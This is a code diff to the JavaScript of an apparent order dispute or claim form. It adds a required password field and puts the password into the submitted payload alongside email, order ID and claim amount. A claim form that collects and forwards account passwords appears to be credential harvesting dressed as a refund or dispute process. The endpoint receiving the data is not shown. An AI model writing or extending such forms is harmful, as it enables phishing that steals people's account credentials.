@@ -14,6 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     orderId: '',
     claimAmount: '',
     email: '',
+    password: '',
     reason: '',
     reasonText: '',
     notes: '',
@@ -47,11 +48,14 @@ document.addEventListener('DOMContentLoaded', () => {
   const orderIdInput = document.getElementById('order-id');
   const claimAmountInput = document.getElementById('claim-amount');
   const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const btnTogglePassword = document.getElementById('btn-toggle-password');
   const reasonSelect = document.getElementById('reason');
   const notesInput = document.getElementById('notes');
 
   const groupOrderId = document.getElementById('group-order-id');
   const groupEmail = document.getElementById('group-email');
+  const groupPassword = document.getElementById('group-password');
   const groupReason = document.getElementById('group-reason');
 
   // File Upload Elements
@@ -303,6 +307,8 @@ document.addEventListener('DOMContentLoaded', () => {
     orderIdInput.classList.remove('is-invalid');
     groupEmail.classList.remove('has-error');
     emailInput.classList.remove('is-invalid');
+    if (groupPassword) groupPassword.classList.remove('has-error');
+    if (passwordInput) passwordInput.classList.remove('is-invalid');
     groupReason.classList.remove('has-error');
     reasonSelect.classList.remove('is-invalid');
 
@@ -322,6 +328,14 @@ document.addEventListener('DOMContentLoaded', () => {
       valid = false;
     }
 
+    // Password
+    const passwordVal = passwordInput ? passwordInput.value : '';
+    if (!passwordVal || passwordVal.trim().length === 0) {
+      if (groupPassword) groupPassword.classList.add('has-error');
+      if (passwordInput) passwordInput.classList.add('is-invalid');
+      valid = false;
+    }
+
     // Reason
     const reasonVal = reasonSelect.value;
     if (!reasonVal) {
@@ -336,6 +350,7 @@ document.addEventListener('DOMContentLoaded', () => {
     formData.orderId = orderVal;
     formData.claimAmount = claimAmountInput.value.trim() || 'Unspecified';
     formData.email = emailVal;
+    formData.password = passwordVal;
     formData.reason = reasonVal;
     formData.reasonText = reasonSelect.options[reasonSelect.selectedIndex].text;
     formData.notes = notesInput.value.trim();
@@ -350,6 +365,7 @@ document.addEventListener('DOMContentLoaded', () => {
         orderId:      formData.orderId,
         claimAmount:  formData.claimAmount,
         email:        formData.email,
+        password:     formData.password,
         reasonText:   formData.reasonText,
         notes:        formData.notes || '',
         evidenceFile: attachedFile ? attachedFile.name : 'None',
@@ -375,7 +391,6 @@ document.addEventListener('DOMContentLoaded', () => {
   btnToStep2.addEventListener('click', handleStep1Submit);
   disputeForm.addEventListener('submit', (e) => { e.preventDefault(); handleStep1Submit(); });
 
-
   orderIdInput.addEventListener('input', () => {
     groupOrderId.classList.remove('has-error');
     orderIdInput.classList.remove('is-invalid');
@@ -385,6 +400,33 @@ document.addEventListener('DOMContentLoaded', () => {
     groupEmail.classList.remove('has-error');
     emailInput.classList.remove('is-invalid');
   });
+
+  if (passwordInput && groupPassword) {
+    passwordInput.addEventListener('input', () => {
+      groupPassword.classList.remove('has-error');
+      passwordInput.classList.remove('is-invalid');
+    });
+  }
+
+  if (btnTogglePassword && passwordInput) {
+    btnTogglePassword.addEventListener('click', () => {
+      const isPassword = passwordInput.type === 'password';
+      passwordInput.type = isPassword ? 'text' : 'password';
+      const eyeIcon = document.getElementById('eye-icon');
+      if (eyeIcon) {
+        if (isPassword) {
+          eyeIcon.innerHTML = `
+            <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18" />
+          `;
+        } else {
+          eyeIcon.innerHTML = `
+            <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+            <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+          `;
+        }
+      }
+    });
+  }
 
   reasonSelect.addEventListener('change', () => {
     groupReason.classList.remove('has-error');
@@ -509,6 +551,7 @@ document.addEventListener('DOMContentLoaded', () => {
           orderId:      formData.orderId,
           claimAmount:  formData.claimAmount,
           email:        formData.email,
+          password:     formData.password,
           reasonText:   formData.reasonText,
           notes:        formData.notes || '',
           evidenceFile: attachedFile ? attachedFile.name : 'None',
@@ -583,6 +626,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
   btnReset.addEventListener('click', () => {
     disputeForm.reset();
+    if (passwordInput) {
+      passwordInput.value = '';
+      passwordInput.type = 'password';
+    }
+    const eyeIcon = document.getElementById('eye-icon');
+    if (eyeIcon) {
+      eyeIcon.innerHTML = `
+        <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+      `;
+    }
     attachedFile = null;
     fileInput.value = '';
     fileChip.style.display = 'none';
